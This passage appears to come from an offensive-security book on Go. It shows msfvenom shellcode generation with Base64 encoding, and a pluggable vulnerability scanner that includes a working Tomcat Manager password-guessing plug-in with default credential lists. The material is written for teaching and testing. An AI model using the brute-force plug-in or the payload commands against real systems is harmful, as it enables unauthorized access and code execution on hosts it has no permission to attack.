such as HTTP. For that reason, it’s worth discussing its usage
in Go.
The easiest method to produce a Base64-encoded
representation of binary data is to use the base64 utility in
Linux. It allows you to encode or decode data via stdin or from
a file. You could use msfvenom to produce raw binary data, and
then encode the result by using the following command:
$ msfvenom -p [payload] [options] - f raw | base64
Much like your C output, the resulting payload contains
line breaks that you’ll have to deal with before including it as
a string in your code. You can use the tr utility in Linux to
clean up the output, removing all line breaks:
$ msfvenom -p [payload] [options] - f raw | base64 | tr -d "\n"
The encoded payload will now exist as a single, continuous
string. In your Go code, you can then get the raw payload as a
byte slice by decoding the string. You use the encoding/base64
package to get the job done:
payload, err :=
base64.StdEncoding.DecodeString("/OiCAAAAYInlMcBki1Awi...WFuZAA=")
You’ll now have the ability to work with the raw binary
data without all the ugliness.
A Note on Assembly
A discussion of shellcode and low-level programming isn’t
complete without at least mentioning assembly. Unfortunately
for the shellcode composers and assembly artists, Go’s
integration with assembly is limited. Unlike C, Go doesn’t
support inline assembly. If you want to integrate assembly into
your Go code, you can do that, sort of. You’ll have to
essentially define a function prototype in Go with the
assembly instructions in a separate file. You then run go build to
compile, link, and build your final executable. While this may
not seem overly daunting, the problem is the assembly
language itself. Go supports only a variation of assembly
based on the Plan 9 operating system. This system was created
by Bell Labs and used in the late 20th century. The assembly
syntax, including available instructions and opcodes, is almost
nonexistent. This makes writing pure Plan 9 assembly a
daunting, if not nearly impossible, task.
SUMMARY
Despite lacking assembly usability, Go’s standard packages
offer a tremendous amount of functionality conducive to
vulnerability hunters and exploit developers. This chapter
covered fuzzing, porting exploits, and handling binary data
and shellcode. As an additional learning exercise, we
encourage you to explore the exploit database at
https://www.exploit-db.com/ and try to port an existing exploit
to Go. Depending on your comfort level with the source
language, this task could seem overwhelming but it can be an
excellent opportunity to understand data manipulation,
network communications, and low-level system interaction.
In the next chapter, we’ll step away from exploitation
activities and focus on producing extendable toolsets.
10
GO PLUGINS AND EXTENDABLE
TOOLS
Many security tools are constructed as frameworks—core
components, built with a level of abstraction that allows you to
easily extend their functionality. If you think about it, this
makes a lot of sense for security practitioners. The industry is
constantly changing; the community is always inventing new
exploits and techniques to avoid detection, creating a highly
dynamic and somewhat unpredictable landscape. However, by
using plug-ins and extensions, tool developers can future-
proof their products to a degree. By reusing their tools’ core
components without making cumbersome rewrites, they can
handle industry evolution gracefully through a pluggable
system.
This, coupled with massive community involvement, is
arguably how the Metasploit Framework has managed to age
so well. Hell, even commercial enterprises like Tenable see the
value in creating extendable products; Tenable relies on a
plug-in-based system to perform signature checks within its
Nessus vulnerability scanner.
In this chapter, you’ll create two vulnerability scanner
extensions in Go. You’ll first do this by using the native Go
plug-in system and explicitly compiling your code as a shared
object. Then you’ll rebuild the same plug-in by using an
embedded Lua system, which predates the native Go plug-in
system. Keep in mind that, unlike creating plug-ins in other
languages, such as Java and Python, creating plug-ins in Go is
a fairly new construct. Native support for plug-ins has existed
only since Go version 1.8. Further, it wasn’t until Go version
1.10 that you could create these plug-ins as Windows dynamic
link libraries (DLLs). Make sure you’re running the latest
version of Go so that all the examples in this chapter work as
planned.
USING GO’S NATIVE PLUG-IN
SYSTEM
Prior to version 1.8 of Go, the language didn’t support plug-
ins or dynamic runtime code extendibility. Whereas languages
like Java allow you to load a class or JAR file when you
execute your program to instantiate the imported types and call
their functions, Go provided no such luxury. Although you
could sometimes extend functionality through interface
implementations and such, you couldn’t truly dynamically
load and execute the code itself. Instead, you needed to
properly include it during compile time. As an example, there
was no way to replicate the Java functionality shown here,
which dynamically loads a class from a file, instantiates the
class, and calls someMethod() on the instance:
File file = new File("/path/to/classes/");
URL[] urls = new URL[]{file.toURL()};
ClassLoader cl = new URLClassLoader(urls);
Class clazz = cl.loadClass("com.example.MyClass");
clazz.getConstructor().newInstance().someMethod();
Luckily, the later versions of Go have the ability to mimic
this functionality, allowing developers to compile code
explicitly for use as a plug-in. Limitations exist, though.
Specifically, prior to version 1.10, the plug-in system worked
only on Linux, so you’d have to deploy your extendable
framework on Linux.
Go’s plug-ins are created as shared objects during the
building process. To produce this shared object, you enter the
following build command, which supplies plugin as the buildmode
option:
$ go build -buildmode=plugin
Alternatively, to build a Windows DLL, use c-shared as the
buildmode option:
$ go build -buildmode=c-shared
To build a Windows DLL, your program must meet certain
conventions to export your functions and also must import the
C library. We’ll let you explore these details on your own.
Throughout this chapter, we’ll focus almost exclusively on the
Linux plug-in variant, since we’ll demonstrate how to load and
use DLLs in Chapter 12.
After you’ve compiled to a DLL or shared object, a
separate program can load and use the plug-in at runtime. Any
of the exported functions will be accessible. To interact with
the exported features of a shared object, you’ll use Go’s plugin
package. The functionality in the package is straightforward.
To use a plug-in, follow these steps:
1. Call plugin.Open(filename string) to open a shared object file, creating a
*plugin.Plugin instance.
2. On the *plugin.Plugin instance, call Lookup(symbolName string) to retrieve a
Symbol (that is, an exported variable or function) by name.
3. Use a type assertion to convert the generic Symbol to the type expected by your
program.
4. Use the resulting converted object as desired.
You may have noticed that the call to Lookup() requires the
consumer to supply a symbol name. This means that the
consumer must have a predefined, and hopefully publicized,
naming scheme. Think of it as almost a defined API or generic
interface to which plug-ins will be expected to adhere.
Without a standard naming scheme, new plug-ins would
require you to make changes to the consumer code, defeating
the entire purpose of a plug-in-based system.
In the examples that follow, you should expect plug-ins to
define an exported function named New() that returns a specific
interface type. That way, you’ll be able to standardize the
bootstrapping process. Getting a handle back to an interface
allows us to call functions on the object in a predictable way.
Now let’s start creating your pluggable vulnerability
scanner. Each plug-in will implement its own signature-
checking logic. Your main scanner code will bootstrap the
process by reading your plug-ins from a single directory on
your filesystem. To make this all work, you’ll have two
separate repositories: one for your plug-ins and one for the
main program that consumes the plug-ins.
Creating the Main Program
Creating the Main Program
Let’s start with your main program, to which you’ll attach
your plug-ins. This will help you understand the process of
authoring your plug-ins. Set up your repository’s directory
structure so it matches the one shown here:
$ tree
.
--- cmd
--- scanner
--- main.go
--- plugins
--- scanner
--- scanner.go
The file called cmd/scanner/main.go is your command line
utility. It will load the plug-ins and initiate a scan. The plugins
directory will contain all the shared objects that you’ll load
dynamically to call various vulnerability signature checks.
You’ll use the file called scanner/scanner.go to define the data
types your plug-ins and main scanner will use. You put this
data into its own package to make it a little bit easier to use.
Listing 10-1 shows what your scanner.go file looks like.
(All the code listings at the root location of / exist under the
provided github repo https://github.com/blackhat-go/bhg/.)
package scanner
// Scanner defines an interface to which all checks adhere
❶ type Checker interface {
❷ Check(host string, port uint64) *Result
}
// Result defines the outcome of a check
❸ type Result struct {
Vulnerable bool
Details string
}
Listing 10-1: Defining core scanner types (/ch-10/plugin-core/scanner/scanner.go)
In this package, named scanner, you define two types. The
first is an interface called Checker ❶. The interface defines a
single method named Check() ❷, which accepts a host and port
value and returns a pointer to a Result. Your Result type is
defined as a struct ❸. Its purpose is to track the outcome of the
check. Is the service vulnerable? What details are pertinent in
documenting, validating, or exploiting the flaw?
You’ll treat the interface as a contract or blueprint of sorts;
a plug-in is free to implement the Check() function however it
chooses, so long as it returns a pointer to a Result. The logic of
the plug-in’s implementation will vary based on each plug-in’s
vulnerability-checking logic. For instance, a plug-in checking
for a Java deserialization issue can implement the proper
HTTP calls, whereas a plug-in checking for default SSH
credentials can issue a password-guessing attack against the
SSH service. The power of abstraction!
Next, let’s review cmd/scanner/main.go, which will
consume your plug-ins (Listing 10-2).
const PluginsDir = "../../plugins/" ❶
func main() {
var (
files []os.FileInfo
err error
p *plugin.Plugin
n plugin.Symbol
check scanner.Checker
res *scanner.Result
)
if files, err = ioutil.ReadDir(PluginsDir)❷; err != nil {
log.Fatalln(err)
}
for idx := range files { ❸
fmt.Println("Found plugin: " + files[idx].Name())
if p, err = plugin.Open(PluginsDir + "/" + files[idx].Name())❹; err != nil {
log.Fatalln(err)
}
if n, err = p.Lookup("New")❺; err != nil {
log.Fatalln(err)
}
newFunc, ok := n.(func() scanner.Checker) ❻
if !ok {
log.Fatalln("Plugin entry point is no good. Expecting: func New()
scanner.Checker{ ... }")
}
check = newFunc()❼
res = check.Check("10.0.1.20", 8080) ❽
if res.Vulnerable { ❾
log.Println("Host is vulnerable: " + res.Details)
} else {
log.Println("Host is NOT vulnerable")
}
}
}
Listing 10-2: The scanner client that runs plug-ins (/ch-10/plugin-
core/cmd/scanner/main.go)
The code starts by defining the location of your plug-ins
❶. In this case, you’ve hardcoded it; you could certainly
improve the code so it reads this value in as an argument or
environment variable instead. You use this variable to call
ioutil.ReadDir(PluginDir) and obtain a file listing ❷, and then loop
over each of these plug-in files ❸. For each file, you use Go’s
plugin package to read the plug-in via a call to plugin.Open() ❹. If
this succeeds, you’re given a *plugin.Plugin instance, which you
assign to the variable named p. You call p.Lookup("New") to
search your plug-in for a symbol named New ❺.
As we mentioned during the high-level overview earlier,
this symbol lookup convention requires your main program to
provide the explicit name of the symbol as an argument,
meaning you expect the plug-in to have an exported symbol by
the same name—in this case, our main program is looking for
the symbol named New. Furthermore, as you’ll see shortly, the
code expects the symbol to be a function that will return a
concrete implementation of your scanner.Checker interface, which
we discussed in the previous section.
Assuming your plug-in contains a symbol named New, you
make a type assertion for the symbol as you try to convert it to
type func() scanner.Checker ❻. That is, you’re expecting the
symbol to be a function that returns an object implementing
scanner.Checker. You assign the converted value to a variable
named newFunc. Then you invoke it and assign the returned
value to a variable named check ❼. Thanks to your type
assertion, you know that check satisfies your scanner.Checker
interface, so it must implement a Check() function. You call it,
passing in a target host and port ❽. The result, a *scanner.Result,
is captured using a variable named res and inspected to
determine whether the service was vulnerable or not ❾.
Notice that this process is generic; it uses type assertions
and interfaces to create a construct through which you can
dynamically call plug-ins. Nothing within the code is specific
to a single vulnerability signature or method used to check for
a vulnerability’s existence. Instead, you’ve abstracted the
functionality enough that plug-in developers can create stand-
alone plug-ins that perform units of work without having
knowledge of other plug-ins—or even extensive knowledge of
the consuming application. The only thing that plug-in authors
must concern themselves with is properly creating the
exported New() function and a type that implements
scanner.Checker. Let’s have a look at a plug-in that does just that.
Building a Password-Guessing Plug-in
This plug-in (Listing 10-3) performs a password-guessing
attack against the Apache Tomcat Manager login portal. A
favorite target for attackers, the portal is commonly configured
to accept easily guessable credentials. With valid credentials,
an attacker can reliably execute arbitrary code on the
underlying system. It’s an easy win for attackers.
In our review of the code, we won’t cover the specific
details of the vulnerability test, as it’s really just a series of
HTTP requests issued to a specific URL. Instead, we’ll focus
primarily on satisfying the pluggable scanner’s interface
requirements.
import (
// Some snipped for brevity
"github.com/bhg/ch-10/plugin-core/scanner" ❶
)
var Users = []string{"admin", "manager", "tomcat"}
var Passwords = []string{"admin", "manager", "tomcat", "password"}
// TomcatChecker implements the scanner.Check interface. Used for guessing
Tomcat creds
type TomcatChecker struct{} ❷
// Check attempts to identify guessable Tomcat credentials
func (c *TomcatChecker) Check(host string, port uint64) *scanner.Result { ❸
var (
resp *http.Response
err error
url string
res *scanner.Result
client *http.Client
req *http.Request
)
log.Println("Checking for Tomcat Manager...")
res = new(scanner.Result) ❹
url = fmt.Sprintf("http://%s:%d/manager/html", host, port)
if resp, err = http.Head(url); err != nil {
log.Printf("HEAD request failed: %s\n", err)
return res
}
log.Println("Host responded to /manager/html request")
// Got a response back, check if authentication required
if resp.StatusCode != http.StatusUnauthorized ||
resp.Header.Get("WWW-Authenticate") == "" {
log.Println("Target doesn't appear to require Basic auth.")
return res
}
// Appears authentication is required. Assuming Tomcat manager. Guess
passwords...
log.Println("Host requires authentication. Proceeding with password
guessing...")
client = new(http.Client)
if req, err = http.NewRequest("GET", url, nil); err != nil {
log.Println("Unable to build GET request")
return res
}
for _, user := range Users {
for _, password := range Passwords {
req.SetBasicAuth(user, password)
if resp, err = client.Do(req); err != nil {
log.Println("Unable to send GET request")
continue
}
if resp.StatusCode == http.StatusOK { ❺
res.Vulnerable = true
res.Details = fmt.Sprintf("Valid credentials found - %s:%s", user,
password)
return res
}
}
}
return res
}
// New is the entry point required by the scanner
func New() scanner.Checker { ❻
return new(TomcatChecker)
}
Listing 10-3: Creating a Tomcat credential-guessing plug-in natively (/ch-
10/plugin-tomcat/main.go)
First, you need to import the scanner package we detailed
previously ❶. This package defines both the Checker interface
and the Result struct that you’ll be building. To create an
implementation of Checker, you start by defining an empty struct
type named TomcatChecker ❷. To fulfill the Checker interface’s
implementation requirements, you create a method matching
the required Check(host string, port uint64) *scanner.Result function
signature ❸. Within this method, you perform all of your
custom vulnerability-checking logic.
Since you’re expected to return a *scanner.Result, you
initialize one, assigning it to a variable named res ❹. If the
conditions are met—that is, if the checker verifies the
guessable credentials—and the vulnerability is confirmed ❺,
you set res.Vulnerable to true and set res.Details to a message
containing the identified credentials. If the vulnerability isn’t
identified, the instance returned will have res.Vulnerable set to its
default state—false.
Lastly, you define the required exported function New()
*scanner.Checker ❻. This adheres to the expectations set by your